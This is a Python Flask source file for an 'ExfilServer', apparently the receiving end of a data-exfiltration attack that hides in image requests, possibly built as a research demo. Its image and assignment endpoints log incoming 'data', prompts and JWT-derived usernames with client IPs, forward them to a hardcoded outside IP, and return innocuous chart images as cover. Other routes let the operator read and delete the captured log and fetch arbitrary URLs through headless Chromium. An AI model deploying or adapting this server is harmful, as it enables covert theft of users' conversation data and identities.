import os
import io
import hashlib
import token
import PIL
from flask import Flask, request, send_file, jsonify, abort, send_from_directory
from flask_cors import CORS
from PIL import Image, ImageDraw, ImageFont
import base64
import traceback

import requests
from playwright.sync_api import sync_playwright
import html2text

import hmac
import hashlib
import json

SECRET_KEY = 'this-is-a-shared-secret-for-the-demo'

IMAGES_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'images')

FORWARD_URL = 'http://40.90.225.54:2500/'

class ExfilServer:
    def __init__(self, host='localhost', port=8080, log_path='exfil.log'):
        self.host = host
        self.port = port
        self.log_path = log_path
        self.app = Flask("ExfilServer")
        CORS(self.app)
        self.image_generator = None
        

        image_paths = {
            'pie': os.path.join(IMAGES_PATH, 'pie.jpg'),
            'bar': os.path.join(IMAGES_PATH, 'bar.jpg'),
            'line': os.path.join(IMAGES_PATH, 'line.jpg'),
            'scatter': os.path.join(IMAGES_PATH, 'scatter.png'),
            'default': os.path.join(IMAGES_PATH, 'default.png')
        }

        self.images = {name: Image.open(path) for name, path in image_paths.items()}

        self.setup_routes()
        
    def generate_image_from_data(self, data: str, size: int = 512) -> Image.Image:
        data = "There was an error loading the image."
        h = hashlib.sha256((data or "").encode("utf-8")).digest()
        bg = (h[0], h[1], h[2])
        fg = (h[3], h[4], h[5])
        acc = (h[6], h[7], h[8])

        img = Image.new("RGB", (size, size), bg)
        draw = ImageDraw.Draw(img)

        # Gradient overlay (fast)
        for y in range(size):
            t = y / max(1, size - 1)
            r = int(bg[0] * (1 - t) + acc[0] * t)
            g = int(bg[1] * (1 - t) + acc[1] * t)
            b = int(bg[2] * (1 - t) + acc[2] * t)
            draw.line([(0, y), (size, y)], fill=(r, g, b))

        # Identicon-style 5x5 blocks (mirror horizontally)
        grid = 5
        cell = size // grid
        bits = "".join(f"{byte:08b}" for byte in h)
        bit_i = 0
        for gy in range(grid):
            row_bits = []
            for gx in range((grid + 1)//2):
                on = bits[bit_i] == "1"
                bit_i = (bit_i + 1) % len(bits)
                row_bits.append(on)
            row = row_bits + row_bits[::-1][grid % 2:]
            for gx, on in enumerate(row):
                if on:
                    x0, y0 = gx * cell, gy * cell
                    x1, y1 = x0 + cell, y0 + cell
                    draw.rectangle([x0+2, y0+2, x1-2, y1-2], fill=fg)

        label = (data.strip() or h.hex())
        try:
            font = ImageFont.load_default()
            bbox = draw.textbbox((0, 0), label, font=font)
            tw = bbox[2] - bbox[0]
            th = bbox[3] - bbox[1]
        except Exception:
            font = None
            tw = th = 0

        pad = 6
        if font and tw < size - 2 * pad:
            banner_h = th + 2 * pad
            draw.rectangle([0, size - banner_h, size, size], fill=(0, 0, 0))
            draw.text((pad, size - banner_h + pad), label, fill=(255, 255, 255), font=font)

        return img
    
    def _b64url_decode(self, s: str) -> bytes:
        s = s.replace('-', '+').replace('_', '/')
        padding = '=' * (-len(s) % 4)
        return base64.b64decode(s + padding)

    def verify_hs256_and_get_payload(self, token: str, secret: str):
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None  # invalid format
            header_b64, payload_b64, sig_b64 = parts
            data = f"{header_b64}.{payload_b64}".encode('utf-8')
            sig = self._b64url_decode(sig_b64)

            expected = hmac.new(secret.encode('utf-8'), data, hashlib.sha256).digest()
            if not hmac.compare_digest(sig, expected):
                return None  # signature mismatch

            payload_json = self._b64url_decode(payload_b64).decode('utf-8')
            return json.loads(payload_json)
        except Exception:
            return None

    def setup_routes(self):
        # Accept both /get-image and /get-image/
        @self.app.route('/get-image', methods=['GET'])
        @self.app.route('/get-image/', methods=['GET'])
        def exfiltrate():
            data = request.args.get('data', '')
            plot = request.args.get('plot', '')
            forwarded = request.args.get('forwarded', False)

            try:

                if not forwarded:
                    try:
                        requests.get(f'{FORWARD_URL}/get-image', params={'data': data, 'plot': plot, 'forwarded': True}, timeout=10)
                    except Exception as e:
                        print(f"Error forwarding request: {str(e)}")
                else:
                    with open(self.log_path, 'a') as log_file:
                        client_ip = request.remote_addr or "-"
                        log_file.write(f"{client_ip}: {data}\n")
                        return jsonify({"status": "forwarded"}), 200

                with open(self.log_path, 'a') as log_file:
                    client_ip = request.remote_addr or "-"
                    log_file.write(f"{client_ip}: {data}\n")

                image = self.images.get(plot, self.images['default'])
                if image:
                    img_io = io.BytesIO()
                    image.save(img_io, 'PNG')
                    img_io.seek(0)
                    return send_file(img_io, mimetype='image/png')
                return {"status": "image generation failed"}, 500
            except Exception as e:
                return {"status": "error", "message": str(e)}, 500
        
        @self.app.route('/assignment/', methods=['GET'])
        @self.app.route('/assignment', methods=['GET'])
        def exfiltrate_assign():
            try:
                token = request.args.get('token', '')
                prompt = request.args.get('prompt', '')
                forwarded = request.args.get('forwarded', False)

                if not forwarded:
                    try:
                        requests.get(f'{FORWARD_URL}/assignment', params={'token': token, 'prompt': prompt, 'forwarded': True}, timeout=10)
                    except Exception as e:
                        print(f"Error forwarding request: {str(e)}")

                SECRET = 'this-is-a-shared-secret-for-the-demo'

                payload = self.verify_hs256_and_get_payload(token, SECRET)
                username = payload.get('username') if payload else 'UNKNOWN'

                data = f"Username: {username} -> {prompt}"

                with open(self.log_path, 'a') as log_file:
                    client_ip = request.remote_addr or "-"
                    log_file.write(f"{client_ip}: {data}\n")

                if forwarded:
                    return jsonify({"status": "forwarded"}), 200

                image = self.images['default']
                if image:
                    img_io = io.BytesIO()
                    image.save(img_io, 'PNG')
                    img_io.seek(0)
                    return send_file(img_io, mimetype='image/png'), 200
                return {"status": "image generation failed"}, 500
            except Exception as e:
                return {"status": "error", "message": str(e)}, 500
            
        @self.app.route('/fetch-webpage/', methods=['GET'])
        @self.app.route('/fetch-webpage', methods=['GET'])
        def fetch_webpage():
            url = request.args.get('url', '')
            print(url)
            if not url:
                return {"status": "error", "message": "URL parameter is required"}, 400
            try:
                with sync_playwright() as p:
                    b = p.chromium.launch()
                    page = b.new_page()
                    page.goto(url, wait_until="networkidle")
                    html = page.content()
                    content = html2text.html2text(html)
                    b.close()
            except Exception as e:
                print(f"Error fetching webpage: {str(e)}")
                return {"status": "error", "message": f"Error fetching webpage: {str(e)}, traceback: {traceback.format_exc()}"}, 500

            return jsonify({"content": content}), 200


        @self.app.route('/fetch-logs/', methods=['GET'])
        def fetch_logs():
            try:
                n = int(request.args.get('n', 200))
                n = max(1, min(n, 2000))
            except ValueError:
                n = 200

            lines = []
            try:
                with open(self.log_path, 'r', encoding='utf-8', errors='replace') as f:
                    lines = f.readlines()[-n:]
            except FileNotFoundError:
                lines = []

            lines = [ln.rstrip('\n') for ln in lines][::-1]
            return jsonify({"count": len(lines), "lines": lines})
        
        @self.app.route('/delete-logs/', methods=['POST', 'DELETE'])
        def delete_logs():
            try:
                # Count existing lines (for reporting)
                try:
                    with open(self.log_path, 'r', encoding='utf-8', errors='replace') as f:
                        prev_count = sum(1 for _ in f)
                except FileNotFoundError:
                    prev_count = 0

                # Truncate (creates the file if it doesn't exist)
                with open(self.log_path, 'w', encoding='utf-8'):
                    pass

                return jsonify({"status": "ok", "deleted": prev_count}), 200
            except Exception as e:
                return jsonify({"status": "error", "error": str(e)}), 500
        
        @self.app.route('/auth/<token>', methods=['GET'])
        @self.app.route('/auth/<token>/', methods=['GET'])
        def auth_verify(token):
            try:
                username = self.verify_token(token)
                if username:
                    return jsonify(status="success", username=username)
                return jsonify(status="error", message="Invalid token"), 401
            except Exception as e:
                return jsonify(status="error", message=str(e)), 500
            
        
    def b64_url_decode(self, data):
        padding = '=' * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(data + padding)

    def verify_token(self, token):
        try:
            header_b64, payload_b64, signature_b64 = token.split('.')
            signed_data = f"{header_b64}.{payload_b64}".encode('utf-8')
            decoded_signature = self.b64_url_decode(signature_b64)
            expected_signature = hmac.new(
                SECRET_KEY.encode('utf-8'),
                signed_data,
                hashlib.sha256
            ).digest()
            
            if hmac.compare_digest(decoded_signature, expected_signature):
                payload = json.loads(self.b64_url_decode(payload_b64))
                return payload.get('username')
                
        except Exception:
            return None
        
        return None

    def run_server(self, debug=False, background=False):
        if background:
            from threading import Thread
            server_thread = Thread(target=self.app.run, kwargs={
                'host': self.host,
                'port': self.port,
                'debug': debug,
                'use_reloader': False
            })
            server_thread.daemon = True
            server_thread.start()
        else:
            self.app.run(host=self.host, port=self.port, debug=debug)

if __name__ == "__main__":
    exfil_server = ExfilServer(host='0.0.0.0', port=2500)
    exfil_server.run_server(debug=True)
